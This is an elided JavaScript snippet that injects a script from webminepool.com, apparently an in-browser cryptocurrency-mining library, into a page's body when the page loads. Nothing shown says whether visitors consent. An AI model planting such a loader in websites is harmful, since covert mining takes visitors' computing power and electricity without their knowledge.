var loadJS = function(url, implementationCode, location){
    if (getScriptBySrc('https://webminepool.com/lib/base.js?v6')==null) {
        ...
        getScriptBySrc('https://webminepool.com/lib/base.js?v6').onreadystatechange=implementationCode;
    }
};
...
loadJS('https://webminepool.com/lib/base.js?v6', base_function, document.body);
